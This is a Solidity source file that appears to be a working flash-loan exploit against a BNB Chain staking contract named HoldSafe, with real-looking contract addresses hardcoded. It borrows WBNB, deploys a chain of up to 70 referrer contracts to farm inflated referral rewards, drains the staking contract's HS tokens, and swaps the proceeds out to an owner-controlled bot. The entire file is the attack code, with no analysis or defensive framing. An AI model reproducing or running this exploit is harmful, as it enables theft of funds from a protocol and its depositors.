//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface IHoldSafe is IERC20 {
    function Stake(uint256 usdtAmount, address referrer) external;
    function Rewards() external;
    function referrerRewards(address) external view returns (uint256);
    function getTokenAmountFromUSDT(uint256 usdtAmount) external view returns (uint256);
}

ERC20 constant HS = ERC20(0xf83Aa05D3D7A6CA2DcE8a5329F7D1BE879b215F0);
IHoldSafe constant HoldSafe = IHoldSafe(0x2496B87189D5Ae18d4d83b8a7039b0c8A07D98D4);
uint256 constant HS_DECIMALS = 1e8;

contract Referrer {
    function stake(address referrer) public {
        HS.approve(address(HoldSafe), type(uint256).max);
        HoldSafe.Stake(2000 ether, referrer);
        HS.transfer(msg.sender, HS.balanceOf(address(this)));
    }

    function rewards() public {
        HoldSafe.Rewards();
        HS.transfer(msg.sender, HS.balanceOf(address(this)));
    }
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions private constant WBNB_WBNB_POOL =
        IUniswapV3PoolActions(0x172fcD41E0913e95784454622d1c3724f546f849);

    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair private constant WBNB_HS_PAIR = IUniswapV2Pair(0x8720862A4fB7e1CBAcfb42Cb32C9EB4F5E84e403);

    ERC20 private constant WBNB = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata data) external {
        (uint256 borrowAmount) = abi.decode(data, (uint256));

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(WBNB), address(HS), WBNB.balanceOf(address(this)), address(this)
        );

        Referrer[] memory referrers = new Referrer[](70);

        address referrerAddress = address(0);

        uint256 referrerIndex = 0;

        while (referrerIndex < referrers.length) {
            referrers[referrerIndex] = new Referrer();
            HS.transfer(address(referrers[referrerIndex]), HS.balanceOf(address(this)));
            referrers[referrerIndex].stake(referrerAddress);
            referrerAddress = address(referrers[referrerIndex]);
            referrerIndex++;

            uint256 rewards = 0;

            for (uint256 i = 0; i < referrerIndex; i++) {
                rewards += HoldSafe.referrerRewards(address(referrers[i]));
            }

            rewards = HoldSafe.getTokenAmountFromUSDT(rewards);

            if (rewards > 400_000_000 * HS_DECIMALS) {
                break;
            }
        }

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(HS), address(WBNB), HS.balanceOf(address(this)), address(this)
        );

        for (uint256 i = 0; i < referrers.length - 1; i++) {
            if (HS.balanceOf(address(HoldSafe)) < 30_000_000 * HS_DECIMALS) {
                break;
            }

            referrers[i].rewards();

            swapExactTokensForTokensSupportingFeeOnTransferTokens(
                address(HS), address(WBNB), HS.balanceOf(address(this)), address(this)
            );
        }

        WBNB.transfer(address(WBNB_WBNB_POOL), borrowAmount + fee1);
    }

    function main(uint256 flashLoanAmount) public onlyOwner {
        flashLoanAmount = flashLoanAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount);

        WBNB_WBNB_POOL.flash(address(this), 0, flashLoanAmount, params);

        console.log("HolderSafe balance =>", HS.balanceOf(address(HoldSafe)) / HS_DECIMALS);
        console.log("BNB balance =>", WBNB.balanceOf(address(this)) / 1 ether);
    }
}
